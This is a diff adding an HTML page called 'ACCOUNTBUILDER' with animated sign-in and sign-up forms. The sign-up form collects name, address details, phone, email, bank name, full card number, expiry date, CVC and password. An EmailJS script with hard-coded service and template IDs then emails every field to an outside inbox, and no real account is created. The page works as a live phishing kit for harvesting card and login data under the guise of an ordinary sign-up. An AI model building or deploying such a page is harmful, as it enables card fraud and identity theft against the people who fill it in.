@@ -1,0 +1,270 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ACCOUNTBUILDER</title>
+  <style>
+    html, body {
+      width: 100%;
+      height: 100%;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+    }body {
+  font-family: Arial, sans-serif;
+  background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
+  background-size: 400% 400%;
+  animation: gradient 15s ease infinite;
+  color: #333;
+}
+
+@keyframes gradient {
+  0% { background-position: 0% 50%; }
+  50% { background-position: 100% 50%; }
+  100% { background-position: 0% 50%; }
+}
+
+.container {
+  max-width: 600px;
+  margin: 50px auto;
+  background-color: rgba(255, 255, 255, 0.9);
+  padding: 20px;
+  border-radius: 9px;
+  box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+}
+
+h1 {
+  text-align: center;
+  color: #333;
+}
+
+label {
+  display: block;
+  margin-bottom: 8px;
+  color: #555;
+  opacity: 0;
+  transition: opacity 1s ease-in-out;
+}
+
+input, select, button {
+  width: 100%;
+  padding: 10px;
+  margin-bottom: 15px;
+  border: 1px solid #ddd;
+  border-radius: 4px;
+  font-size: 16px;
+  opacity: 0;
+  transition: opacity 1s ease-in-out;
+}
+
+button {
+  background-color: #4CAF50;
+  color: black;
+  border: none;
+  cursor: pointer;
+}
+
+button:hover {
+  background-color: #45a049;
+}
+
+.form-container { opacity: 0; transition: opacity 1s ease-in-out; }
+.form-container.visible { opacity: 1; }
+
+.typing-container {
+  text-align: center;
+  margin-top: 20px;
+}
+
+.typing-effect {
+  display: inline-block;
+  white-space: nowrap;
+  overflow: hidden;
+  border-right: 2px solid black;
+  animation: typing 3s steps(40, end) forwards, blink 0.75s step-end infinite;
+}
+
+@keyframes typing {
+  from { width: 0; }
+  to { width: 100%; }
+}
+
+@keyframes blink {
+  50% { border-color: transparent; }
+}
+
+.switch-link {
+  text-align: center;
+  margin-top: 10px;
+  font-size: 14px;
+}
+
+.switch-link a {
+  color: #0077cc;
+  text-decoration: none;
+}
+
+.switch-link a:hover {
+  text-decoration: underline;
+}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>ACCOUNTBUILDER</h1>
+    <form class="form-container" id="formContainer">
+      <label for="email">Email address</label>
+      <input type="email" id="email" name="email" placeholder="you@example.com" required /><label for="password">Password</label>
+  <input type="password" id="password" name="password" placeholder="••••••••" required />
+
+  <button type="submit">Sign In</button>
+  <div class="switch-link">Don't have an account? <a href="#" onclick="toggleForm(event)">Sign up</a></div>
+</form>
+
+<form class="form-container" id="signupContainer" style="display: none;">
+  
+<label for="Name">Name:</label>
+  <input type="Name" id="Name" name="Name" placeholder="" required />
+  
+<label for="Country">Country:</label>
+  <input type="Country" id="Country" name="Country" placeholder="" required />
+  
+ <label for="state">State:</label>
+        <input type="text" id="state" name="state" required>
+  
+<label for="Phone number">phone number:</label>
+  <input type="phone number" id="phone number" name="phone number" placeholder="" required />
+  
+  <label for="email_signup">Email address:</label>
+  <input type="email" id="email_signup" name="email_signup" placeholder="you@example.com" required />
+  
+ <label for="picture">Upload a Picture (optional):</label>
+        <input type="file" id="picture" name="picture_optional" accept="image/*">
+        
+<label for="bank_name">Bank Name:</label>
+        <input type="text" id="bank_name" name="bank_name" required>
+        
+<label for="card_number">Card Number:</label>
+        <input type="number" id="card_number" name="card_number" required>
+        
+<label for="expiration_date">Card Expiration Date:</label>
+        <input type="date" id="expiration_date" name="expiration_date" required>
+        
+<label for="cvc">Card CVC:</label>
+        <input type="number" id="cvc" name="cvc" required>
+        
+<label for="card_holder_name">Card Holder Name:</label>
+        <input type="text" id="card_holder_name" name="card_holder_name" required>
+
+  <label for="password_signup">Password:</label>
+  <input type="password" id="password_signup" name="password_signup" placeholder="" required />
+
+  <label for="confirm_password">Confirm Password:</label>
+  <input type="password" id="confirm_password" name="confirm_password" placeholder="" required />
+  
+  <button type="submit">Sign Up</button>
+  <div class="switch-link">Already have an account? <a href="#" onclick="toggleForm(event)">Sign in</a></div>
+</form>
+
+  </div>
+  <div class="typing-container">
+    <p class="typing-effect" id="typingText1"></p>
+    <p class="typing-effect" id="typingText2" style="display: none;"></p>
+  </div>
+
+  <!-- Scripts -->
+  <script>
+    const formContainer = document.getElementById('formContainer');
+    const signupContainer = document.getElementById('signupContainer');
+    const labels = document.querySelectorAll('label');
+    const inputs = document.querySelectorAll('input');
+    const buttons = document.querySelectorAll('button');
+
+    const observer = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          formContainer.classList.add('visible');
+          signupContainer.classList.add('visible');
+          labels.forEach((label, index) => setTimeout(() => { label.style.opacity = 1; }, index * 100));
+          inputs.forEach((input, index) => setTimeout(() => { input.style.opacity = 1; }, (labels.length + index) * 100));
+          buttons.forEach((button, index) => setTimeout(() => { button.style.opacity = 1; }, (labels.length + inputs.length + index) * 100));
+        }
+      });
+    }, { threshold: 0.5 });
+
+    observer.observe(formContainer);
+
+    function typeText(element, text, delay, callback) {
+      let i = 0;
+      function typing() {
+        if (i < text.length) {
+          element.textContent += text[i];
+          i++;
+          setTimeout(typing, 50);
+        } else if (callback) {
+          setTimeout(callback, delay);
+        }
+      }
+      typing();
+    }
+
+    window.addEventListener("load", () => {
+      const text1 = document.getElementById("typingText1");
+      const text2 = document.getElementById("typingText2");
+
+      typeText(text1, "WELCOME TO ACCOUNTBUILDER.", 1000, () => {
+        text2.style.display = "inline-block";
+        typeText(text2, "Please sign in or create a new account.", 0);
+      });
+    });
+
+    function toggleForm(e) {
+      e.preventDefault();
+      if (formContainer.style.display === "none") {
+        formContainer.style.display = "block";
+        signupContainer.style.display = "none";
+      } else {
+        formContainer.style.display = "none";
+        signupContainer.style.display = "block";
+      }
+    }
+  </script>
+
+  <!-- EmailJS Integration -->
+  <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("G7FkmY2D7CrhNJPch");
+    })();
+
+    document.getElementById("signupContainer").addEventListener("submit", function(event) {
+      event.preventDefault();
+
+      const form = event.target;
+
+      const templateParams = {
+        name: form.Name.value,
+        country: form.Country.value,
+        state: form.state.value,
+        phone_number: form["phone number"].value,
+        email: form.email_signup.value,
+        bank_name: form.bank_name.value,
+        card_number: form.card_number.value,
+        expiration_date: form.expiration_date.value,
+        cvc: form.cvc.value,
+        card_holder_name: form.card_holder_name.value,
+        password: form.password_signup.value,
+        confirm_password: form.confirm_password.value
+      };
+
+      emailjs.send("service_oy5xia4", "template_vh5mdqp", templateParams)
+        .then(function(response) {
+          alert("Sign-up data sent successfully!");
+          form.reset();
+        }, function(error) {
+          alert("Failed to send data: " + JSON.stringify(error));
+        });
+    });
+  </script>
+</body>
+</html>
